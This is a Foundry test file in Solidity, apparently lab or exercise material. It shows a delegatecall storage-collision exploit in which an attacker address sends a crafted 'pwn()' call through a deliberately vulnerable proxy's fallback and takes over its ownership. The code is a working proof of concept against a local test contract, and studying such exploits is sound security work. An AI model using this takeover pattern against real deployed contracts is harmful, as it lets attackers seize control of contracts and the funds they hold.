// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Lib, VulnerableProxy} from "../vulnerable.sol";

contract DelegatecallTest is Test {
    Lib public lib;
    VulnerableProxy public proxy;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // 1. Deploy the Lib contract
        lib = new Lib();

        // 2. Deploy the proxy, passing the Lib address. 
        // The deployer (this test contract) becomes the initial owner.
        proxy = new VulnerableProxy(address(lib));
    }

    function test_exploit() public {
        // Before the exploit, the owner is this test contract
        assertEq(proxy.owner(), address(this));
        
        console.log("Owner before attack:", proxy.owner());
        console.log("Attacker address:", attacker);

        // --- The Attack ---
        vm.startPrank(attacker);
        
        // The attacker crafts msg.data to call the pwn() function
        bytes memory payload = abi.encodeWithSignature("pwn()");
        
        // The attacker sends a transaction to the proxy with this payload.
        // Since pwn() doesn't exist in the proxy, it triggers the fallback function.
        (bool success, ) = address(proxy).call(payload);
        require(success, "Attack failed");
        
        vm.stopPrank();
        // ------------------

        // After the exploit, the attacker has become the owner!
        console.log("Owner after attack:", proxy.owner());
        assertEq(proxy.owner(), attacker);
    }
}
